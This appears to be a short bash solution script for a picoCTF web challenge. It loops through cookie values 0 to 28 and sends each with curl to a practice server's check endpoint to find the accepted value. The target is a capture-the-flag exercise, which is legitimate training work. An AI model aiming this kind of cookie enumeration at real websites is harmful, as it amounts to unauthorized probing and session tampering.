for i in {0..28}
do
    curl --cookie "name=$i" "http://mercury.picoctf.net:54219/check"
done